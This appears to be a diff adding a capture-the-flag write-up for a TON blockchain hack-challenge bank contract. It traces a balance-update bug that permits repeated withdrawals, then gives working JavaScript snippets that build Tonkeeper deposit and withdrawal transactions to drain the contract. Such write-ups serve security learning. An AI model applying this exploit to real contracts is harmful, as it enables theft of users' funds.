@@ -1,0 +1,81 @@
+Understanding the task
+
+Open the repo https://github.com/ton-blockchain/hack-challenge-1.
+
+Navigate to the second task https://github.com/ton-blockchain/hack-challenge-1/tree/master/2.%20bank.
+
+Read and understand the task. https://github.com/ton-blockchain/hack-challenge-1/tree/master/2.%20bank, 
+the contract is just a bank, user can put in and withdraw the money
+
+Looked up the contract on tonscan https://tonscan.org/address/EQAcUZubVYakkC5IiW1k9sFroNSfCfXYIgp5t5ba0w-CtBoq, saw that there's a balance of 3000 TON.
+
+Looked at the actual contract code. https://github.com/ton-blockchain/hack-challenge-1/blob/master/2.%20bank/bank.func.
+
+Smart contract
+
+Verified there's nothing unusual in the internal messages part, and moved to op-codes. https://github.com/ton-blockchain/hack-challenge-1/blob/master/2.%20bank/bank.func#L11-L27
+
+Depositing money: https://github.com/ton-blockchain/hack-challenge-1/blob/master/2.%20bank/bank.func#L29-L37. When adding money, the deposited amount of money is added to the account balance sans the fee of  1 TON
+
+Withdrawal:
+https://github.com/ton-blockchain/hack-challenge-1/blob/master/2.%20bank/bank.func#L38-L55. The User balance is loaded and then it's verified that the requested amount is less than the account balance. Then the user balance is updated and the withdrawal happens
+
+There was a mistake in the code updating the account balance:
+https://github.com/ton-blockchain/hack-challenge-1/blob/master/2.%20bank/bank.func#L44-L47. 
+
+If the balance after the withdrawal equals 0, the balance doesn't get updates. this allows performing multiple withdrawals as long as the amount equals the account balance.
+
+Time to write the exploit
+
+Exploit
+
+I used Tonkeeper to send the transaction.
+
+First transaction deposits the money on the smart contract. To do this I used the following snippet below:
+
+import { beginCell } from 'ton';
+
+const address = 'EQAcUZubVYakkC5IiW1k9sFroNSfCfXYIgp5t5ba0w-CtBoq';
+const ton = 1e9; // Deposit 1 TON
+const fee = 1e7; // Fee 0.01 TON
+
+const cell = beginCell()
+  .storeUint(0, 32) // opcode for making the deposit
+  .storeUint(0, 64) // query id
+  .endCell(); 
+
+const data = cell.toBoc().toString('base64')
+  .replaceAll('+', '-')
+  .replaceAll('/', '_');
+
+const url = `https://app.tonkeeper.com/transfer/${address}?amount=${ton + fee}&bin=${data}`;
+
+The snippet creates a cell for adding money to the account, in this case we deposit 1 TON, and then a tonkeeper link is generated. 
+
+After sending out the transaction, the smart contract account balance would be 1 TON.
+
+Second transaction: withdrawing the same amount that was added, using the following snippet: 
+
+import { beginCell } from 'ton';
+
+const address = 'EQAcUZubVYakkC5IiW1k9sFroNSfCfXYIgp5t5ba0w-CtBoq';
+const ton = 1e9; // request for withdrawing 1 TON
+const fee = 1e7; // fee 
+
+const cell = beginCell()
+  .storeUint(1, 32) // opcode for withdrawal
+  .storeUint(0, 64) // query id
+  .storeCoins(ton)  // requested amount
+  .endCell(); 
+
+const data = cell.toBoc().toString('base64')
+  .replaceAll('+', '-')
+  .replaceAll('/', '_');
+
+const url = `https://app.tonkeeper.com/transfer/${address}?amount=${fee}&bin=${data}`;
+
+The snippet creates a cell for withdrawing from the account. The sum has to match the account balance, for the exploit to work. 
+
+Then a tonkeeper transaction link is generated. 
+ 
+After executing the transaction, the smart contract sends back 1 TON, but keeps the same account balance, so it's possible to repeat this, until the contract runs out of tons.
